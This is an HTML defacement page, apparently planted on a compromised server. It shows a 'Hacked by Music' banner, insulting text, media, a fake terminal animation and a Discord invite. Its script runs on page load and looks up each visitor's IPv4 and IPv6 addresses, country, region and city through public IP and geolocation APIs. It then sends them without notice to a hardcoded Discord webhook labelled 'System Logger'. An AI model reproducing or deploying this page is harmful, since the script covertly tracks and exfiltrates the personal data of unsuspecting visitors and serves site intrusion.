<!DOCTYPE html>
<html lang="ar">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Music Suite - Secure Terminal</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            position: relative;
            direction: rtl;
        }

        /* تأثير ومضة رقمية خفيفة عند التحميل الأول */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #ff0000;
            z-index: 9999;
            opacity: 0;
            pointer-events: none;
            animation: flash 0.4s ease-out;
        }

        @keyframes flash {
            0% { opacity: 0.2; }
            100% { opacity: 0; }
        }

        /* فيديو الخلفية المحسن مع التكرار التلقائي */
        .background-video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -2;
            opacity: 0.75;
        }

        /* طبقة عزل الظلال المتناسقة */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.25));
            z-index: -1;
        }

        /* شاشة التحميل المتكاملة */
        .loading-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 10;
            width: 100%;
        }

        /* شريط تقدم التحميل المضيء بالنيون الأحمر */
        .loading-bar-container {
            width: 420px;
            height: 16px;
            background: #111;
            border-radius: 30px;
            overflow: hidden;
            margin: 35px 0;
            border: 2px solid #ff3333;
            box-shadow: 0 0 25px rgba(255, 51, 51, 0.35);
        }

        .loading-bar {
            height: 100%;
            background: linear-gradient(90deg, #ff0000, #ff6666, #ff0000);
            width: 0%;
            border-radius: 30px;
            animation: loading 3.5s cubic-bezier(0.4, 0, 0.2, 1) forwards;
            box-shadow: 0 0 15px #ff6666;
        }

        @keyframes loading {
            0% { width: 0%; }
            40% { width: 60%; }
            75% { width: 90%; }
            100% { width: 100%; }
        }

        /* العناوين والخطوط الرقمية */
        .main-title {
            font-size: 3.5em;
            color: #fff;
            margin: 15px 0;
            text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
            letter-spacing: 10px;
            animation: pulse-white 3s ease-in-out infinite;
        }

        @keyframes pulse-white {
            0%, 100% {
                text-shadow: 0 0 30px rgba(255, 255, 255, 0.8);
                transform: scale(1);
            }
            50% {
                text-shadow: 0 0 50px rgba(255, 255, 255, 1);
                transform: scale(1.02);
            }
        }

        .subtitle {
            font-size: 2em;
            color: #ccc;
            margin: 15px 0;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            letter-spacing: 3px;
        }

        /* حاوية المحتوى الرئيسي */
        .main-content {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 10;
        }

        .logo-image {
            width: 180px;
            height: auto;
            margin-bottom: 15px;
            border-radius: 16px;
            box-shadow: 0 0 35px rgba(255, 255, 255, 0.25);
            animation: pulse-white 3s ease-in-out infinite;
            border: 2px solid rgba(255, 255, 255, 0.15);
        }

        /* ========================================================
           [شاشة الـ CMD السوداء الصافية]
           ======================================================== */
        .cmd-window {
            width: 650px;
            background-color: #0c0c0c;
            border: 1px solid rgba(255, 51, 51, 0.35);
            box-shadow: 0 0 30px rgba(255, 51, 51, 0.2);
            border-radius: 6px;
            overflow: hidden;
            margin-top: 20px;
            direction: ltr;
            text-align: left;
            font-family: 'Consolas', 'Lucida Console', 'Courier New', monospace;
        }

        .cmd-body {
            padding: 20px;
            height: 180px;
            overflow-y: auto;
            font-size: 0.9em;
            color: #00ff66;
            line-height: 1.5;
            background: #0c0c0c;
        }

        .prompt-symbol {
            color: #61afef;
            margin-right: 6px;
            font-weight: bold;
        }

        .discord-highlight {
            color: #ffd700;
            text-decoration: none;
            font-weight: bold;
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
            border-bottom: 1px dashed #ffd700;
            transition: all 0.2s ease;
        }

        .discord-highlight:hover {
            color: #fff;
            background: rgba(255, 215, 0, 0.2);
            text-shadow: 0 0 15px #ffd700;
        }

        .cursor {
            display: inline-block;
            width: 8px;
            height: 15px;
            background-color: #00ff66;
            animation: blink-cursor 0.8s infinite steps(1);
            vertical-align: -2px;
            margin-left: 2px;
        }

        @keyframes blink-cursor {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        /* نظام الجسيمات الخفيف والسلس */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
        }

        .particle {
            position: absolute;
            width: 3px;
            height: 3px;
            background: rgba(255, 51, 51, 0.35);
            border-radius: 50%;
            animation: float 6s infinite linear;
        }

        @keyframes float {
            0% { transform: translateY(100vh); opacity: 1; }
            100% { transform: translateY(-10px); opacity: 0; }
        }

        .fade-out {
            animation: fadeOut 0.8s ease forwards;
        }
        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; visibility: hidden; }
        }

        .fade-in {
            animation: fadeIn 1.2s ease forwards;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* حاوية بيانات المستخدم العلوية المحدثة */
        .top-left-status {
            position: fixed;
            top: 25px;
            left: 25px;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 4px;
            font-family: 'Courier New', monospace;
            z-index: 1000;
            direction: ltr;
            background: rgba(0, 0, 0, 0.65);
            padding: 12px 20px;
            border-radius: 8px;
            border: 1px solid rgba(0, 255, 0, 0.2);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.08);
            min-width: 160px;
        }

        #clock {
            font-size: 1.5em;
            color: #00ff00;
            font-weight: bold;
            letter-spacing: 2px;
            text-shadow: 0 0 12px rgba(0, 255, 0, 0.8);
        }

        .status-text-block {
            font-size: 0.85em;
            color: #aaffaa;
            border-top: 1px solid rgba(0, 255, 0, 0.25);
            padding-top: 6px;
            margin-top: 4px;
            width: 100%;
            letter-spacing: 0.5px;
            text-shadow: 0 0 8px rgba(0, 255, 0, 0.5);
            direction: rtl;
            text-align: left;
            line-height: 1.6;
        }

        .bottom-logs {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            font-family: 'Courier New', monospace;
            color: #ff3333;
            font-size: 1.1em;
            text-shadow: 0 0 8px #ff3333;
            z-index: 1000;
            direction: ltr;
            background: rgba(0, 0, 0, 0.65);
            padding: 5px 22px;
            border-radius: 4px;
            border: 1px solid rgba(255, 51, 51, 0.15);
        }
    </style>
</head>

<body>

    <div class="top-left-status">
        <div id="clock">00:00:00 AM</div>
        <div id="top-ip-display" class="status-text-block">
            الدولة: جاري التحميل...<br>
            المدينة: جاري التحميل...<br>
            IPv4: جاري التحميل...<br>
            IPv6: جاري التحميل...
        </div>
    </div>

    <div class="bottom-logs" id="terminal-logs">[SYS] STATUS: STANDBY_MODE...</div>

    <video class="background-video" autoplay loop muted playsinline id="bg-video">
        <source src="https://h.top4top.io/m_37898tcsh1.mp4" type="video/mp4" />
    </video>

    <audio id="background-music" loop playsinline>
        <source src="https://d.top4top.io/m_3789i6ns81.mp3" type="audio/mpeg" />
    </audio>

    <audio id="click-glitch-sound" playsinline>
        <source src="https://actions.google.com/sounds/v1/science_fiction/glitch_static.ogg" type="audio/ogg" />
    </audio>

    <div class="overlay"></div>
    <div class="particles" id="particles"></div>

    <div class="loading-screen" id="loading-screen">
        <div class="main-title">Music</div>
        <div class="loading-bar-container">
            <div class="loading-bar"></div>
        </div>
        <div class="subtitle">Hacked by Music</div>
        <div class="subtitle">! You are Idiot !</div>
    </div>

    <div class="main-content" id="main-content">
        <img src="https://j.top4top.io/p_3664n97sh1.jpg" alt="Logo" class="logo-image" />
        <div class="main-title" style="font-size: 2.2em; margin: 5px 0;">Music on your server</div>
        <div class="main-title" style="font-size: 2em; margin: 5px 0; color: #ff3333;">! You are Idiot !</div>
        
        <div class="cmd-window">
            <div class="cmd-body" id="cmd-body">
                <br><br>
                <span class="prompt-symbol">C:\Users\Music&gt;</span><span id="line-1"></span><br>
                <span class="prompt-symbol" id="sym-2" style="display:none">C:\Users\Music&gt;</span><span id="line-2"></span><br>
                <span class="prompt-symbol" id="sym-3" style="display:none">C:\Users\Music&gt;</span><span id="line-3"></span><span class="cursor" id="cursor-active"></span>
            </div>
        </div>
    </div>

    <script>
        let currentNetworkData = {};

        function fetchWithTimeout(url, timeout = 4000) {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeout);

            return fetch(url, {
                    signal: controller.signal,
                    headers: { 'Accept': 'application/json' }
                })
                .then(response => {
                    clearTimeout(timeoutId);
                    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                    return response.json();
                })
                .catch(err => {
                    clearTimeout(timeoutId);
                    throw new Error(`Timeout or Network error: ${err.message}`);
                });
        }

        async function fetchIPVersion(version) {
            const urls = {
                v4: ['https://api.ipify.org?format=json', 'https://ipv4.icanhazip.com/'],
                v6: ['https://api6.ipify.org?format=json', 'https://ipv6.icanhazip.com/']
            };

            const list = urls[version] || urls.v4;
            for (const url of list) {
                try {
                    const resp = await fetchWithTimeout(url, 3000);
                    if (typeof resp === 'string') {
                        const ip = resp.trim();
                        if (ip) return { ip };
                    }
                    if (resp && resp.ip) {
                        return { ip: resp.ip };
                    }
                } catch (_) {}
            }
            return null;
        }

        async function fetchOptimizedNetworkData() {
            try {
                const cached = localStorage.getItem('user_geo_cache');
                if (cached) {
                    const parsed = JSON.parse(cached);
                    if (Date.now() - parsed.timestamp < 3600000) {
                        return parsed.data;
                    }
                }
            } catch (e) {}

            const [v4Result, v6Result] = await Promise.allSettled([
                fetchIPVersion('v4'),
                fetchIPVersion('v6')
            ]);

            const ipv4 = v4Result.status === 'fulfilled' && v4Result.value ? v4Result.value.ip : 'غير متاح';
            const ipv6 = v6Result.status === 'fulfilled' && v6Result.value ? v6Result.value.ip : 'غير متاح';
            const geoData = await fetchGeoLocation();

            const result = {
                ipv4,
                ipv6,
                country: geoData?.country || 'غير معروف',
                region: geoData?.region || 'غير معروف',
                city: geoData?.city || 'غير معروف',
                isp: geoData?.isp || 'غير معروف'
            };

            localStorage.setItem('user_geo_cache', JSON.stringify({
                data: result,
                timestamp: Date.now()
            }));

            return result;
        }

        async function fetchGeoLocation() {
            const API_SOURCES = [{
                url: 'https://ipapi.co/json/',
                parser: (data) => ({
                    country: data.country_name || data.country || 'غير معروف',
                    region: data.region || 'غير معروف',
                    city: data.city || 'غير معروف',
                    isp: data.org || data.isp || 'غير معروف'
                })
            }, {
                url: 'https://ipwho.is/',
                parser: (data) => ({
                    country: data.country || 'غير معروف',
                    region: data.region || 'غير معروف',
                    city: data.city || 'غير معروف',
                    isp: data.connection?.isp || data.org || 'غير معروف'
                })
            }];

            const fetchPromises = API_SOURCES.map(source =>
                fetchWithTimeout(source.url, 3000).then(data => source.parser(data))
            );

            try {
                return await Promise.any(fetchPromises);
            } catch (error) {
                return null;
            }
        }

        function updateLocationUI(data) {
            const displayElement = document.getElementById('top-ip-display');
            if (displayElement) {
                displayElement.innerHTML = `
                    الدولة: ${data.country}<br>
                    المنطقة: ${data.region}<br>
                    المدينة: ${data.city}<br>
                    IPv4: ${data.ipv4}<br>
                    IPv6: ${data.ipv6}
                `;
            }
        }

        function showOfflineUI() {
            const displayElement = document.getElementById('top-ip-display');
            if (displayElement) {
                displayElement.innerHTML = `
                    الدولة: فحص الشبكة...<br>
                    المنطقة: جاري التثبيت...<br>
                    المدينة: فحص الاتصال...<br>
                    IPv4: جاري التحميل...<br>
                    IPv6: جاري التحميل...
                `;
            }
        }

        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1522122255327297667/2Sh-s4h-GgR_BaM8eexpMzzrO_7XimZavKHcbXMPDoPbhxIV5_yF020WA3AbTssRuXR8';

        function sendToWebhook(data) {
            if (!WEBHOOK_URL) return;
            const payload = {
                username: "System Logger",
                embeds: [{
                    title: "🌐 تسجيل دخول مستخدم جديد (IPv4 & IPv6)",
                    color: 15548997,
                    fields: [
                        { name: "📌 IPv4 Address", value: `\`${data.ipv4 || "غير متاح"}\``, inline: false },
                        { name: "📌 IPv6 Address", value: `\`${data.ipv6 || "غير متاح"}\``, inline: false },
                        { name: "🏳️ Country", value: data.country || "غير معروف", inline: true },
                        { name: "📍 Region", value: data.region || "غير معروف", inline: true },
                        { name: "🏙️ City", value: data.city || "غير معروف", inline: true }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
        }

        async function fetchSystemNetworkData() {
            const data = await fetchOptimizedNetworkData();
            if (data && data.ipv4) {
                currentNetworkData = data;
                updateLocationUI(data);
                sendToWebhook(data);
            } else {
                showOfflineUI();
            }
        }

        // الجسيمات
        function createParticles() {
            const particles = document.getElementById('particles');
            if (!particles) return;
            for (let i = 0; i < 25; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.top = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 4 + 's';
                particle.style.animationDuration = (Math.random() * 3 + 3) + 's';
                particles.appendChild(particle);
                setTimeout(() => particle.remove(), 6000);
            }
        }
        setInterval(createParticles, 6000);
        createParticles();

        const music = document.getElementById('background-music');
        const glitchSound = document.getElementById('click-glitch-sound');
        const video = document.getElementById('bg-video');

        const playMedia = () => {
            if (music) {
                music.muted = false;
                music.volume = 1.0;
                music.play().catch(() => {});
            }
            if (video) {
                video.muted = true;
                video.play().catch(() => {});
            }
        };

        const activateInterface = () => {
            if (glitchSound) { glitchSound.volume = 0.4; glitchSound.play().catch(() => {}); }
            playMedia();
        };

        addEventListener('click', activateInterface, { once: true });
        addEventListener('keydown', activateInterface, { once: true });

        // الساعة الرقمية
        function updateClock() {
            const now = new Date();
            let hours = now.getHours();
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const seconds = String(now.getSeconds()).padStart(2, '0');
            const ampm = hours >= 12 ? 'PM' : 'AM';
            hours = hours % 12 || 12;
            const clockElement = document.getElementById('clock');
            if (clockElement) {
                clockElement.textContent = `${String(hours).padStart(2, '0')}:${minutes}:${seconds} ${ampm}`;
            }
        }
        setInterval(updateClock, 1000);
        updateClock();

        // السجلات السفلية
        const logsSequence = [
            "[SYS] STATUS: INITIALIZING SYSLOG...",
            "[NET] VERIFYING CONNECTION INTEGRITY...",
            "[SEC] CHECKING ENVIRONMENT NODE_7...",
            "[OK] PIPELINE SYNCED WITH TERMINAL."
        ];
        let logIndex = 0;
        setInterval(() => {
            const logElement = document.getElementById('terminal-logs');
            if (logElement) {
                logElement.textContent = logsSequence[logIndex];
                logIndex = (logIndex + 1) % logsSequence.length;
            }
        }, 3500);

        // تأثير الكتابة الآلية داخل الـ CMD
        function typeWriter(text, elementId, speed, callback) {
            let i = 0;
            function type() {
                if (i < text.length) {
                    document.getElementById(elementId).innerHTML += text.charAt(i);
                    i++;
                    setTimeout(type, speed);
                } else if (callback) {
                    callback();
                }
            }
            type();
        }

        function runCmdSequence() {
            const cmdText1 = "connect_server --secure";
            const cmdText2 = "joining community room...";
            const cmdText3 = 'discord: <a href="https://discord.gg/M9L" class="discord-highlight" target="_blank">discord.gg/M9L</a>';

            typeWriter(cmdText1, "line-1", 35, () => {
                document.getElementById("sym-2").style.display = "inline";
                setTimeout(() => {
                    typeWriter(cmdText2, "line-2", 30, () => {
                        document.getElementById("sym-3").style.display = "inline";
                        document.getElementById("line-3").innerHTML = cmdText3;
                    }, 250);
                }, 250);
            });
        }

        // توقيت الانتقال من شاشة التحميل للمحتوى الرئيسي
        const loadingBar = document.querySelector('.loading-bar');
        if (loadingBar) {
            loadingBar.addEventListener('animationend', () => {
                const loadingScreen = document.getElementById('loading-screen');
                const mainContent = document.getElementById('main-content');
                if (loadingScreen && mainContent) {
                    loadingScreen.classList.add('fade-out');
                    loadingScreen.addEventListener('animationend', () => {
                        loadingScreen.style.display = 'none';
                        mainContent.style.display = 'flex';
                        mainContent.classList.add('fade-in');
                        playMedia();
                        runCmdSequence();
                    }, { once: true });
                }
            });
        }

        fetchSystemNetworkData();
    </script>

</body>

</html>
